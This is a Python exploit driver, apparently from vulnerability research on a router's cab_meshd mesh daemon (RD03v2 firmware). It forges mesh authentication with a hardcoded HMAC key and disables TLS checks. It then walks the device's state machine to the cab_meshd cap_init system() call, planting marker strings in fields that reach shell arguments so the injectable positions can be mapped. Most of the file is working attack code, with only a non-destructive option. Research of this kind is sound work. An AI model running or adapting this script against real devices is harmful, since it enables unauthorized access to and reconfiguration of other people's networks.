#!/usr/bin/env python3
"""Full cab_meshd mesh handshake driver (fake RE -> real CAP), for RD03v2 2.0.28.

Purpose: drive a CAP/server all the way to ST_RUNNING and the cap_init system()
call, reading each reply and responding in-protocol, with a distinctive marker in
every attacker-influenced field so the resulting argv (captured by the emulator
shim over mesh_connect.sh) reveals exactly which positionals we control.

State machine (enum at 0x386, transitions from the binary):
  ST_SSL_DONE(3) --recv type4 auth_req-->  verify(q-key) --> ST_AUTH_SENT(4)
     CAP also sends: type5 auth_reply + type4 its-own auth_req
  ST_AUTH_SENT(4) --recv type5 auth_reply[body0==1]--> change_state(6)=ST_RUNNING
     then send_sync_req(0x5420): CAP sends its config as type6
  ST_RUNNING(6)  --recv type7 sync_reply[body0==1]--> process_sync_reply(0x63e0)
     --> cap_init builder(0xa3bc) --> system("mesh_connect.sh cap_init ...")

Header (44B, big-endian; body then read into the same buffer):
  [0:2]=version 0x1001  [2:4]=body len  [4:6]=type
  [6:0x19]  MAC2 -> strncpy(conn+0xe8, ., strlen)   (0x67e4)
  [0x19:0x2c] MAC5 -> strncpy(conn+0xfb, ., strlen) (0x6818)
Type-4 body:
  [0x00] id (NUL-term)   [0x10] pass=base64(HMAC-SHA256("q38d...", id))
  [0x90] 19B -> strncpy(conn+0x10e, ., 0x13)  (0x6058)   <- becomes cap_init $1
"""

import argparse
import base64
import hashlib
import hmac
import os
import socket
import ssl
import struct
import sys
import threading
import time

CONST = b"838d364d8ed3bd085e150211ea6b3715"
VER = 0x1001
HDR = 0x2c


def key(role):  # 'q' verifies incoming (server); 'x' is what a CAP sends
    return role.encode() + CONST[1:]


def hpass(ident, role=b"q"):
    return base64.b64encode(hmac.new(key(role.decode()), ident, hashlib.sha256).digest())


def log(m):
    print(m, flush=True)


def mkhdr(typ, blen, mac2=b"", mac5=b""):
    h = bytearray(HDR)
    h[0:2] = struct.pack(">H", VER)
    h[2:4] = struct.pack(">H", blen)
    h[4:6] = struct.pack(">H", typ)
    if mac2:
        h[6:6 + len(mac2)] = mac2[:0x12]
    if mac5:
        h[0x19:0x19 + len(mac5)] = mac5[:0x12]
    return bytes(h)


def recv_loop(s, stop, dump_sync=None):
    """Print every frame the CAP sends, so we can follow the state machine."""
    s.settimeout(1.0)
    buf = b""
    while not stop.is_set():
        try:
            chunk = s.recv(4096)
        except (socket.timeout, ssl.SSLWantReadError):
            continue
        except OSError:
            break
        if not chunk:
            log("[recv] peer closed")
            break
        buf += chunk
        while len(buf) >= HDR:
            ver, blen, typ = struct.unpack(">HHH", buf[0:6])
            if len(buf) < HDR + blen:
                break
            body = buf[HDR:HDR + blen]
            buf = buf[HDR + blen:]
            printable = bytes(c if 32 <= c < 127 else 0x2e for c in body[:64])
            log(f"[recv] type={typ} len={blen} body0={body[:1].hex()} "
                f"head={printable.decode()!r}")
            # the sync config (type 6) carries a JSON blob; surface it in full
            js = body.find(b"{")
            je = body.rfind(b"}")
            if typ == 6 and js != -1 and je > js:
                log("[recv]   sync-config JSON:")
                log("           " + body[js:je + 1].decode("utf-8", "replace"))
            if typ == 6 and dump_sync:
                flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW
                fd = os.open(dump_sync, flags, 0o600)
                os.fchmod(fd, 0o600)
                with os.fdopen(fd, "wb") as output:
                    output.write(body)
                log(f"[recv]   wrote raw type-6 body to {dump_sync}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.31.1")
    ap.add_argument("--port", type=int, default=19553)
    ap.add_argument("--id", default="deadbeefcafe01")
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--plant", default="PLANT_0x10e_ABCDE",
                    help="<=19B, lands at conn+0x10e -> cap_init $1")
    ap.add_argument("--mac2", default="MAC2_e8")
    ap.add_argument("--mac5", default="MAC5_fb")
    ap.add_argument("--hold", type=float, default=6.0)
    ap.add_argument("--dump-sync", metavar="PATH",
                    help="write the raw type-6 sync body to PATH")
    ap.add_argument("--no-trigger", action="store_true",
                    help="stop after receiving the sync config; do NOT send the "
                         "type-7 that triggers cap_init (non-destructive: no wifi "
                         "reconfiguration on the target)")
    args = ap.parse_args()

    ident = args.id.encode()
    plant = args.plant.encode()[:0x13]
    mac2 = args.mac2.encode()
    mac5 = args.mac5.encode()

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    # cab_meshd's small slot pool can stall the first handshake; retry.
    s = None
    for _i in range(4):
        try:
            s = ctx.wrap_socket(socket.create_connection((args.host, args.port),
                                                         timeout=args.timeout))
            break
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as _e:
            if _i == 3:
                raise
            log(f"[!] TLS connect {_i+1}/4 failed ({type(_e).__name__}); "
                f"cab_meshd slot busy, waiting 15s")
            time.sleep(15)
    log(f"[+] TLS {s.version()} {s.cipher()[0]}")

    stop = threading.Event()
    rx = threading.Thread(target=recv_loop, args=(s, stop, args.dump_sync), daemon=True)
    rx.start()

    def send(typ, body, mac2=b"", mac5=b""):
        pkt = mkhdr(typ, len(body), mac2, mac5) + body
        s.sendall(pkt)
        log(f"[send] type={typ} len={len(body)}")

    # 1) type-4 auth_req: id@0, pass@0x10, plant@0x90; MACs in header
    b4 = bytearray(0xa4)
    b4[0:len(ident)] = ident
    p = hpass(ident, b"q")
    b4[0x10:0x10 + len(p)] = p
    b4[0x90:0x90 + len(plant)] = plant
    send(4, bytes(b4), mac2, mac5)
    time.sleep(1.2)

    # 2) type-5 auth_reply: body[0]=1 => ST_RUNNING, CAP sends its sync_req
    b5 = bytearray(0x20)
    b5[0] = 1
    send(5, bytes(b5))
    time.sleep(1.5)

    if args.no_trigger:
        log("[*] --no-trigger: holding to capture sync config, not sending type-7")
        time.sleep(args.hold)
    else:
        # 3) type-7 sync_reply: body[0]=1 => accept => CAP runs cap_init
        b7 = bytearray(0x110)
        b7[0] = 1
        send(7, bytes(b7))
        time.sleep(args.hold)

    stop.set()
    try:
        s.close()
    except OSError:
        pass
    log("[*] done")


if __name__ == "__main__":
    sys.exit(main())
